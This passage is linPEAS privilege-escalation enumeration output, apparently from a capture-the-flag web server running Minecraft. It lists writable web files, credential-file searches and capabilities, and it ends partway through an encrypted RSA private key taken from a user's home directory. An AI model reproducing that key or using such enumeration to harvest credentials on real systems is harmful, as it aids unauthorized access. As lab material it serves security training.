@@ -1968,3 +1968,988 @@ include /etc/ld.so.conf.d/*.conf
 
 ╔══════════╣ Capabilities
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+
+╔══════════╣ AppArmor binary profiles
+-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
+-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
+-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
+-rw-r--r-- 1 root root 26912 Mar 26  2021 usr.lib.snapd.snap-confine.real
+-rw-r--r-- 1 root root  1793 Apr 23  2021 usr.sbin.mysqld
+-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
+-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+╔══════════╣ Executable files potentially added by user (limit 70)
++18:59:58.6021454460 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
++18:59:58.5995905690 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
++18:59:58.5969078930 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
++18:59:58.5941463810 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
++18:59:58.5915073840 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
++18:59:58.5888165450 /var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/cgroup.event_control
++18:59:58.5860111770 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
++18:59:58.5833479250 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
++18:59:58.5806428960 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
++18:59:58.5780212650 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
++18:59:58.5753064500 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
++18:59:58.5725609350 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
++18:59:58.5697549260 /var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
++18:59:58.5671010320 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
++18:59:58.5642832510 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
++18:59:58.5616239170 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
++18:59:58.5589497320 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
++18:59:58.5563342400 /var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service/cgroup.event_control
++18:59:58.5536495280 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
++18:59:58.5484125600 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
++18:59:58.5457385800 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
++18:59:58.5430724330 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
++18:59:58.5403820470 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
++18:59:58.5376005830 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
++18:59:58.5348534250 /var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
++18:59:58.5322459390 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
++18:59:58.5296108480 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
++18:59:58.5268484610 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
++18:59:58.5242441670 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
++18:59:58.5215247550 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
++18:59:58.5188137050 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
++18:59:58.5162198510 /var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
++18:59:58.5136225200 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
++18:59:58.5107679990 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
++18:59:58.5081983670 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
++10:32:21.9685602040 /var/www/tld/index.html
++10:28:20.2288650360 /var/www/store/search.php
++09:46:09.4611556070 /var/www/html/index.php
++16:28:41.2009863390 /var/www/store/assets/styles.css
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 12
+drwxr-xr-x  3 root         root      4096 Jun 27  2021 .
+drwxr-xr-x 24 root         root      4096 Sep 30  2021 ..
+drwxr-x---  4 cybercrafted minecraft 4096 Jun 27  2021 minecraft
+
+╔══════════╣ Unexpected in root
+/initrd.img
+/initrd.img.old
+/swap.img
+/vmlinuz.old
+/vmlinuz
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
+total 36
+drwxr-xr-x   2 root root 4096 Jun 26  2021 .
+drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
+-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
+-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
+-rwxr-xr-x   1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh
+-rwxr-xr-x   1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
+-rw-r--r--   1 root root  833 Feb  2  2021 apps-bin-path.sh
+-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
+-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No
+═╣ Can I read shadow plists? ............ No
+═╣ Can I write shadow plists? ........... No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. No
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/xxultimatecreeperxx/.bash_history
+/home/xxultimatecreeperxx/.viminfo
+/root/
+/var/www
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/var/log/auth.log
+/var/log/kern.log
+/var/log/syslog
+/var/log/journal/ebe56de9a97145f5aa1f42ef72793146/system.journal
+
+logrotate 3.11.0
+
+╔══════════╣ Files inside /home/www-data (limit 20)
+
+╔══════════╣ Files inside others home (limit 20)
+/home/xxultimatecreeperxx/.profile
+/home/xxultimatecreeperxx/.hushlogin
+/home/xxultimatecreeperxx/.ssh/id_rsa
+/home/xxultimatecreeperxx/.ssh/authorized_keys
+/home/xxultimatecreeperxx/.bashrc
+/home/xxultimatecreeperxx/.bash_logout
+/var/www/admin/login.php
+/var/www/admin/panel.php
+/var/www/admin/index.php
+/var/www/admin/assets/login.css
+/var/www/admin/assets/logo.png
+/var/www/admin/assets/command.png
+/var/www/admin/assets/panel.css
+/var/www/admin/assets/logBackground.png
+/var/www/admin/assets/lowercase.ttf
+/var/www/admin/assets/mainBackground.png
+/var/www/admin/assets/uppercase.ttf
+/var/www/admin/dbConn.php
+/var/www/store/search.php
+/var/www/store/index.html
+
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 root root 11755 Jun 26  2021 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
+-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 1775 Feb 25  2021 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
+-rw-r--r-- 1 root root 1424 Jun 26  2021 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
+-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 217443 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/.config.old
+-rw-r--r-- 1 root root 0 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 217425 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/.config.old
+-rw-r--r-- 1 root root 0 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
+-rw-r--r-- 1 root root 8881 Aug 19  2021 /lib/modules/4.15.0-156-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 9081 Aug 19  2021 /lib/modules/4.15.0-156-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 8881 Sep 20  2021 /lib/modules/4.15.0-159-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 9081 Sep 20  2021 /lib/modules/4.15.0-159-generic/kernel/drivers/power/supply/wm831x_backup.ko
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /var/lib/mlocate/mlocate.db: regular file, no read permission
+
+╔══════════╣ Web files?(output limit)
+/var/www/:
+total 24K
+drwxr-xr-x  6 root     root     4.0K Jun 26  2021 .
+drwxr-xr-x 14 root     root     4.0K Jun 26  2021 ..
+drwxr-xr-x  3 www-data www-data 4.0K Sep 12  2021 admin
+drwxr-xr-x  2 www-data www-data 4.0K Sep 12  2021 html
+drwxr-xr-x  3 www-data www-data 4.0K Sep 12  2021 store
+drwxr-xr-x  4 www-data www-data 4.0K Sep 12  2021 tld
+
+/var/www/admin:
+
+╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-rw-r-- 1 xxultimatecreeperxx xxultimatecreeperxx 0 Jun 27  2021 /home/xxultimatecreeperxx/.hushlogin
+-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 220 Jun 27  2021 /home/xxultimatecreeperxx/.bash_logout
+-rw-r--r-- 1 root root 20 Mar  8 16:27 /run/cloud-init/.instance-id
+-rw-r--r-- 1 root root 2 Mar  8 16:27 /run/cloud-init/.ds-identify.result
+-rw-r--r-- 1 landscape landscape 0 Aug  6  2020 /var/lib/landscape/.cleanup.user
+-rw-r--r-- 1 root root 2047 Apr 21  2021 /usr/lib/jvm/.java-1.11.0-openjdk-amd64.jinfo
+-rw-r--r-- 1 root root 2764 Apr 21  2021 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo
+-rw-r--r-- 1 root root 0 Jun 27  2021 /etc/.java/.systemPrefs/.systemRootModFile
+-rw-r--r-- 1 root root 0 Jun 27  2021 /etc/.java/.systemPrefs/.system.lock
+-rw------- 1 root root 0 Aug  6  2020 /etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 1531 Jun 26  2021 /etc/apparmor.d/cache/.features
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rwxr-xr-x 1 www-data www-data 828098 Feb 10 20:38 /tmp/linpeas.sh
+-rw-r--r-- 1 root root 3529 Jun 26  2021 /var/backups/apt.extended_states.4.gz
+-rw-r--r-- 1 root root 4247 Sep 30  2021 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 4227 Sep 12  2021 /var/backups/apt.extended_states.2.gz
+-rw-r--r-- 1 root root 4201 Jun 27  2021 /var/backups/apt.extended_states.3.gz
+-rw-r--r-- 1 root root 39711 Oct  4  2021 /var/backups/apt.extended_states.0
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/run/lock
+/run/lock/apache2
+/run/screen
+/tmp
+/tmp/linpeas.sh
+/tmp/tmux-33
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/lib/lxcfs/cgroup/memory/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2x2dpvscan.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+/var/lib/php/sessions
+/var/tmp
+/var/www/admin
+/var/www/admin/assets
+/var/www/admin/assets/login.css
+/var/www/admin/assets/lowercase.ttf
+/var/www/admin/assets/panel.css
+/var/www/admin/assets/uppercase.ttf
+/var/www/admin/dbConn.php
+/var/www/admin/index.php
+/var/www/admin/login.php
+/var/www/admin/panel.php
+/var/www/html
+/var/www/html/index.php
+/var/www/store
+/var/www/store/assets
+/var/www/store/assets/lowercase.ttf
+/var/www/store/assets/styles.css
+/var/www/store/assets/uppercase.ttf
+/var/www/store/index.html
+/var/www/store/search.php
+/var/www/tld
+/var/www/tld/assets
+/var/www/tld/index.html
+/var/www/tld/secret
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+
+╔══════════╣ Searching passwords in history files
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/bin/systemd-ask-password
+/bin/systemd-tty-ask-password-agent
+/etc/java-8-openjdk/management/jmxremote.password
+/etc/pam.d/common-password
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/management/jmxremote.password
+/usr/lib/mysql/plugin/validate_password.so
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
+/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/twisted/cred/credentials.py
+/usr/share/dns/root.key
+/usr/share/doc/git/contrib/credential
+/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
+/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
+/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
+/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
+/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
+/usr/share/man/man1/git-credential-cache--daemon.1.gz
+/usr/share/man/man1/git-credential-cache.1.gz
+/usr/share/man/man1/git-credential-store.1.gz
+/usr/share/man/man1/git-credential.1.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/man/man7/gitcredentials.7.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/pam/common-password.md5sums
+/var/cache/debconf/passwords.dat
+/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
+/var/lib/pam/password
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+ base-passwd depends on libc6 (>= 2.8); however:
+ base-passwd depends on libdebconfclient0 (>= 0.145); however:
+,270 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
+,271 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
+,326 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
+,327 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
+,430 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,430 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,220 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,220 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,784 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,784 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,243 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,243 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,795 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,795 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,874 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,874 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,261 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,261 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,157 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,157 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,659 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,659 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,144 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,144 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,668 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,668 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,080 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,081 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,899 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,899 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,055 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,055 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,259 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,259 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,025 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,025 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,022 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,022 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,333 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,333 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,604 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,604 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,550 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,550 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,416 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,416 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,175 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,175 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,354 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,355 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,684 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,684 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,141 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,141 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,979 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,979 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,183 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,183 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,448 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,448 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,717 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,717 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,363 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,363 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,113 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,113 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,487 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,487 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+we found a private key :)
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
+Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
++Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
+SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
+SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
+lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
+FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
+sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
+stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
+eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
+VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
+LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
+jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
+Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
+8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
+DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
+0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
+MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
